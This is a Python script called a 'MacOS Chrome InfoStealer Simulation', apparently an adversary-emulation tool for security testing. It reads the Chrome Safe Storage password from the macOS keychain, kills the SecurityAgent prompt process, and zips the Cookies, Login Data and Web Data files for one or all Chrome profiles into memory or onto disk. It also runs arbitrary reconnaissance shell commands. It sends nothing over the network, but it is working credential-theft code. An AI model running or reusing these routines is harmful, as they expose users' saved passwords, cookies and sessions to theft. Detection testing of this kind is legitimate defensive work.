#!/usr/bin/env python3
"""
MacOS Chrome InfoStealer Simulation V1

This script simulates the extraction of sensitive information from Google Chrome on macOS systems.
It provides comprehensive functionality for credential access and system reconnaissance:

1. Chrome Credential Access:
   - Retrieves the Chrome safe storage password using the /usr/bin/security utility
   - Copies Chrome browser credential files (Cookies, Login Data, Web Data) to memory
   - Optionally zips the files and saves them to disk
   - Supports multiple Chrome profiles with detection and selection capabilities

2. System Information Gathering:
   - Executes system commands to gather information about the host
   - Provides hardware information using system_profiler
   - Supports custom command execution for targeted information gathering
"""

import argparse
import io
import logging
import os
import signal
import subprocess
import sys
import threading
import time
import zipfile
from typing import List

# Configure logging for better error visibility
logging.basicConfig(
    level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s"
)
logger = logging.getLogger(__name__)


class ChromeProfileManager:
    """Manages Chrome profile detection and file operations."""

    @staticmethod
    def get_chrome_base_dir():
        """Returns the base Chrome directory on macOS."""
        return os.path.expanduser("~/Library/Application Support/Google/Chrome")

    @classmethod
    def list_available_profiles(cls):
        """Lists all available Chrome profiles on the system by scanning the directory."""
        base_dir = cls.get_chrome_base_dir()
        available_profiles = []

        try:
            # List all items in the Chrome directory
            for item in os.listdir(base_dir):
                item_path = os.path.join(base_dir, item)

                # Check if it's a directory
                if os.path.isdir(item_path):
                    # Verify it's a profile by checking for common files
                    for common_file in ["Cookies", "Login Data", "Web Data"]:
                        if os.path.exists(os.path.join(item_path, common_file)):
                            available_profiles.append(item)
                            break

            logger.info(
                f"Found {len(available_profiles)} Chrome profiles: {', '.join(available_profiles)}"
            )
            return available_profiles
        except Exception as e:
            logger.error(f"Error listing Chrome profiles: {e}")
            return ["Default"]  # Fallback to Default profile if error occurs

    @classmethod
    def get_profile_path(cls, profile_name):
        """Gets the full path for a specific Chrome profile."""
        return os.path.join(cls.get_chrome_base_dir(), profile_name)


def chrome_dir(profile="Default"):
    """
    Returns the Google Chrome configuration directory for a specific profile on macOS.

    Args:
        profile (str): The Chrome profile name (default: "Default")

    Returns:
        str: The path to the Chrome profile directory
    """
    return ChromeProfileManager.get_profile_path(profile)


def copy_chrome_files(wtd=False, profile="Default", output_file=None):
    """
    Copies Chrome files into memory, prints the size of each file,
    zips them in memory, prints the size of the zip file,
    and writes the zip file to disk if `wtd` is True.

    Args:
        wtd (bool): If True, writes the zip file to disk in the current working directory.
                    If False, only stores the zip in memory and returns None.
        profile (str): The Chrome profile name to extract files from (default: "Default")

    Returns:
        str or None: Returns the file path of the saved zip file if `wtd` is True.
                     Returns None if `wtd` is False or if an error occurs.
    """
    chrome_files = ["Cookies", "Login Data", "Web Data"]
    zip_buffer = io.BytesIO()
    profile_dir = chrome_dir(profile)

    if not os.path.exists(profile_dir):
        logger.error(f"Chrome profile directory not found: {profile_dir}")
        return None

    logger.info(f"Copying Chrome files from profile: {profile}")

    try:
        # Open a ZipFile object to write files to the in-memory buffer
        with zipfile.ZipFile(zip_buffer, "w", zipfile.ZIP_DEFLATED) as zip_file:
            for file_name in chrome_files:
                src_file = os.path.join(profile_dir, file_name)
                try:
                    if os.path.exists(src_file):
                        # Read file content to memory and log the size
                        with open(src_file, "rb") as f:
                            file_data = f.read()
                            file_size = len(file_data)
                            logger.info(f"Read {file_name}: {file_size} bytes")
                            zip_file.writestr(f"{profile}/{file_name}", file_data)
                    else:
                        logger.warning(
                            f"{file_name} not found in Chrome profile {profile}."
                        )
                except IOError as io_err:
                    logger.error(f"Error reading {file_name}: {io_err}")
                except Exception as e:
                    logger.error(f"Unexpected error while processing {file_name}: {e}")

        # Calculate size of the zip in memory and log it
        zip_size = zip_buffer.tell()
        logger.info(f"Size of zipped file in memory: {zip_size} bytes")

        # Write the zip file to disk if `wtd` is True
        if wtd:
            zip_buffer.seek(0)  # Reset the buffer position to the beginning
            if output_file:
                zip_file_path = os.path.join(os.getcwd(), output_file)
            else:
                zip_file_path = os.path.join(
                    os.getcwd(), f"chrome_files_{profile.lower()}.zip"
                )
            try:
                with open(zip_file_path, "wb") as f:
                    f.write(zip_buffer.read())
                logger.info(f"Zipped Chrome files saved to {zip_file_path}")
                return os.path.abspath(zip_file_path)  # Return the absolute path
            except IOError as io_err:
                logger.error(f"Error writing zip file to disk: {io_err}")
                return None
            except Exception as e:
                logger.error(f"Unexpected error while saving zip file: {e}")
                return None
        else:
            logger.info("Zip file not written to disk as 'wtd' is set to False.")
            return None

    except zipfile.BadZipFile as bz_err:
        logger.error(f"Failed to create zip in memory: {bz_err}")
        return None
    except Exception as e:
        logger.error(f"Unexpected error during in-memory zip creation: {e}")
        return None


def run_system_commands(commands: List[str]) -> None:
    """
    Executes a list of system commands and displays their output.

    Args:
        commands: List of strings, each containing a system command to run
    """
    if not commands:
        logger.warning("No commands provided to run_system_commands")
        return

    for cmd in commands:
        logger.info(f"Executing command: {cmd}")
        try:
            result = subprocess.run(
                cmd,
                shell=True,
                text=True,
                capture_output=True,
                check=False,  # Don't raise exception on non-zero exit
            )

            if result.stdout:
                logger.info(f"Command output:\n{result.stdout.strip()}")

            if result.stderr:
                logger.warning(f"Command error output:\n{result.stderr.strip()}")

            if result.returncode != 0:
                logger.warning(
                    f"Command exited with non-zero status: {result.returncode}"
                )

        except Exception as e:
            logger.error(f"Error executing command '{cmd}': {e}")


def get_chrome_storage_pass(timeout):
    """
    Retrieves the Chrome safe storage password using the macOS `security` command.
    It manages the 'SecurityAgent' process spawned by the 'security' command and
    terminates both processes if the password retrieval takes too long.

    Args:
        timeout (int): The maximum time (in seconds) to wait for the process to complete.

    Returns:
        str or None: Returns the Chrome safe storage password if successful, or None if an error occurs.
    """
    command = "/usr/bin/security find-generic-password -ga 'Chrome'"
    logger.debug(f"Executing command: {command}")

    try:
        process = subprocess.Popen(
            command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True
        )

        if process.pid:
            security_pid = process.pid  # Get the PID of the `security` process
            logger.info(f"Started 'security' process with PID: {security_pid}")
        else:
            logger.error("Failed to create 'security' process.")
            return None

        def terminate_process(proc):
            """
            Terminates the 'SecurityAgent' process within a specific PID range, if found,
            then checks and terminates the main 'security' process if it's still running.

            Args:
                proc: The subprocess.Popen object for the security process
            """
            try:
                # Look for SecurityAgent in a range of PIDs after the security process
                for pid_offset in range(1, 4):
                    possible_agent_pid = security_pid + pid_offset
                    try:
                        ps_command = f"ps -o comm= -p {possible_agent_pid}"
                        ps_output = subprocess.check_output(
                            ps_command, shell=True, text=True
                        ).strip()

                        if "SecurityAgent" in ps_output:
                            logger.info(
                                f"Identified 'SecurityAgent' process with PID {possible_agent_pid}. Terminating it."
                            )
                            os.kill(possible_agent_pid, signal.SIGKILL)
                            time.sleep(0.5)  # Reduced sleep time
                            logger.info(
                                f"Successfully terminated 'SecurityAgent' process with PID {possible_agent_pid}"
                            )
                            break
                    except subprocess.CalledProcessError:
                        logger.debug(
                            f"No 'SecurityAgent' process found with PID {possible_agent_pid}."
                        )
                    except PermissionError as e:
                        logger.error(
                            f"Permission error when attempting to terminate 'SecurityAgent' with PID {possible_agent_pid}: {e}"
                        )
                    except Exception as e:
                        logger.error(
                            f"Unexpected error when handling 'SecurityAgent' with PID {possible_agent_pid}: {e}"
                        )

                # Check if the main `security` process is still running
                if proc.poll() is None:
                    proc.kill()
                    logger.info(
                        f"'security' process with PID {security_pid} terminated after {timeout} seconds timeout"
                    )
                else:
                    logger.info(
                        f"'security' process with PID {security_pid} already terminated."
                    )

            except Exception as e:
                logger.error(f"Error terminating processes: {e}")

        # Start the timer to terminate if timeout is reached
        timer = threading.Timer(timeout, terminate_process, [process])

        try:
            timer.start()
            # Use _ to indicate we're intentionally ignoring stdout
            _, stderr = process.communicate()

            # Cancel the timer if we got a response before timeout
            if timer.is_alive():
                timer.cancel()

            if stderr:
                start = stderr.find(b'password: "') + len(b'password: "')
                end = stderr.find(b'"', start)
                if (
                    start > len(b'password: "') - 1 and end != -1
                ):  # Check if 'password: "' was found
                    password = stderr[start:end].decode("utf-8")
                    logger.info("Chrome storage password successfully retrieved.")
                    return password
                else:
                    logger.error("Password format not found in output.")
                    return None
            else:
                logger.error("No password found in keychain output.")
                return None
        except Exception as e:
            logger.error(
                f"An error occurred while retrieving the Chrome storage password: {e}"
            )
            return None
        finally:
            # Ensure timer is cancelled
            if timer.is_alive():
                timer.cancel()

    except Exception as e:
        logger.error(f"Failed to start security process: {e}")
        return None


def parse_arguments():
    """
    Parse command-line arguments.

    Returns:
        argparse.Namespace: The parsed command-line arguments
    """
    parser = argparse.ArgumentParser(
        description="MacOS Chrome InfoStealer Simulation V1",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Chrome credential access
  python main.py --getSafe --memCopy --timeout 15
  python main.py --getSafe --diskCopy --profile "Profile 1"
  python main.py --listProfiles
  python main.py --allProfiles --getSafe --memCopy

  # System information gathering
  python main.py --systemInfo
  python main.py --systemInfo --commands "uname -a" "ifconfig" "ls -la ~"

  # Combined operations
  python main.py --getSafe --memCopy --systemInfo --verbose
  python main.py --allProfiles --diskCopy --systemInfo --commands "ps aux | grep Chrome"
        """,
    )

    # Core functionality options
    parser.add_argument(
        "-g",
        "--getSafe",
        action="store_true",
        help="Retrieve Chrome safe storage password",
    )
    parser.add_argument(
        "-d",
        "--diskCopy",
        action="store_true",
        help="Copy Chrome data files to disk",
    )
    parser.add_argument(
        "-m",
        "--memCopy",
        action="store_true",
        help="Copy Chrome data files to memory",
    )
    parser.add_argument(
        "-s",
        "--systemInfo",
        action="store_true",
        help="Run system information commands",
    )
    parser.add_argument(
        "-c",
        "--commands",
        nargs="+",
        help="Custom system commands to run (use with --systemInfo)",
    )

    # Profile options
    parser.add_argument(
        "-l",
        "--listProfiles",
        action="store_true",
        help="List available Chrome profiles",
    )
    parser.add_argument(
        "-p",
        "--profile",
        default="Default",
        help="Chrome profile to use (default: Default)",
    )
    parser.add_argument(
        "-a",
        "--allProfiles",
        action="store_true",
        help="Process all available Chrome profiles",
    )

    # Other options
    parser.add_argument(
        "-t",
        "--timeout",
        type=int,
        default=10,
        help="Timeout duration in seconds (default: 10)",
    )
    parser.add_argument(
        "-v", "--verbose", action="store_true", help="Enable verbose logging"
    )
    parser.add_argument(
        "-o",
        "--output",
        help="Specify output file name for disk copies (default: chrome_files_<profile>.zip)",
    )
    parser.add_argument(
        "--no-cleanup",
        action="store_true",
        help="Don't delete files after creating them (for --diskCopy)",
    )

    # Additional system information options
    parser.add_argument(
        "--network-info",
        action="store_true",
        help="Run network-related commands (ifconfig, netstat, etc.)",
    )
    parser.add_argument(
        "--user-info",
        action="store_true",
        help="Run user-related commands (whoami, id, groups, etc.)",
    )

    return parser.parse_args()


def main():
    """
    Main function that parses command-line arguments and executes the requested actions.
    """
    args = parse_arguments()

    # Configure logging level
    if args.verbose:
        logger.setLevel(logging.DEBUG)
        logger.debug("Verbose logging enabled")

    logger.info(
        f"Arguments received: getSafe={args.getSafe}, diskCopy={args.diskCopy}, "
        f"memCopy={args.memCopy}, profile={args.profile}, timeout={args.timeout}, "
        f"listProfiles={args.listProfiles}, allProfiles={args.allProfiles}"
    )

    # List available profiles if requested
    if args.listProfiles:
        profiles = ChromeProfileManager.list_available_profiles()
        if profiles:
            logger.info(f"Available Chrome profiles: {', '.join(profiles)}")
        else:
            logger.error("No Chrome profiles found")
        return

    # Determine which profiles to process
    profiles_to_process = []
    if args.allProfiles:
        profiles_to_process = ChromeProfileManager.list_available_profiles()
        if not profiles_to_process:
            logger.error("No Chrome profiles found")
            return
    else:
        profiles_to_process = [args.profile]

    # Check for conflicting options
    if args.diskCopy and args.memCopy:
        logger.error("Cannot use both --diskCopy and --memCopy at the same time.")
        sys.exit(1)

    # Run system commands if requested
    if args.systemInfo or args.network_info or args.user_info:
        commands = []

        if args.commands:
            commands.extend(args.commands)

        if args.systemInfo and not args.commands:
            commands.append("system_profiler SPHardwareDataType")

        if args.network_info:
            commands.extend(
                ["ifconfig", "netstat -rn", "networksetup -listallnetworkservices"]
            )

        if args.user_info:
            commands.extend(["whoami", "id", "groups", "last $(whoami) | head -5"])

        run_system_commands(commands)

    # Get Chrome safe storage password if requested (only once, as it's the same for all profiles)
    password = None
    if args.getSafe:
        password = get_chrome_storage_pass(args.timeout)
        if password:
            logger.info(f"Chrome Safe Storage Password: {password}")
        else:
            logger.error("Failed to retrieve Chrome Safe Storage password.")

    # Process each profile
    for profile in profiles_to_process:
        logger.info(f"Processing Chrome profile: {profile}")

        # Copy Chrome files to disk if requested
        if args.diskCopy:
            result = copy_chrome_files(
                wtd=True, profile=profile, output_file=args.output
            )
            if result is not None:
                logger.info(f"File created at: {result}")

                # Clean up the file after creating it (unless --no-cleanup is specified)
                if os.path.isfile(result) and not args.no_cleanup:
                    try:
                        os.remove(result)
                        logger.info(f"File {result} has been deleted.")
                    except Exception as e:
                        logger.error(f"Error deleting file {result}: {e}")

        # Copy Chrome files to memory if requested
        elif args.memCopy:
            result = copy_chrome_files(wtd=False, profile=profile)
            if result is not None:
                logger.info(f"Chrome files from profile {profile} copied to memory.")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        logger.info("Operation cancelled by user")
        sys.exit(130)
    except Exception as e:
        logger.critical(f"Unexpected error: {e}", exc_info=True)
        sys.exit(1)
